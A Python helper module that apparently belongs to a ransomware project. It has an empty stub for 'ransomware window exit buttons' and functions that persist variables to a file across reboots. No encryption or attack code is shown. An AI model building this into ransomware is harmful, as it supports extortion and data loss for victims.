import os
from tempfile import mkstemp
from shutil import move, copymode
from os import fdopen, remove
from finals import Finals as final
import ctypes


"""
this is for the ransomware window exit buttons
"""


def exb():
    pass


"""
Funcctions below were created in order to save vars after script is finished / pc is powered off. (shelve library is'nt work)
"""


"""
this function creates var in the vars file, with a value
"""


def create_var(var,value):
    append_con = open(final.path, "a")
    append_con.write(str(var) + ',' + str(value) + "\n")
    append_con.close()
    append_con.close()


    
def replace(pattern, value):
    fh, abs_path = mkstemp()
    with fdopen(fh,'w') as new_file:
        with open(final.path) as old_file:
            for line in old_file:
                parts = line.split(",")
                if str(parts[0]) == str(pattern):
                    new_file.write(line.replace(line, pattern + "," + str(value) + "\n"))
                else:
                    new_file.write(line)
    copymode(final.path, abs_path)
    remove(final.path)
    move(abs_path, final.path)


def get(pattern):
    read_con = open(final.path, "r+")
    content = read_con.read()
    lines = content.split("\n")
    for line in lines:
        parts = line.split(",")
        if str(parts[0]) == str(pattern):
            return parts[1].strip("\n")
    read_con.close()

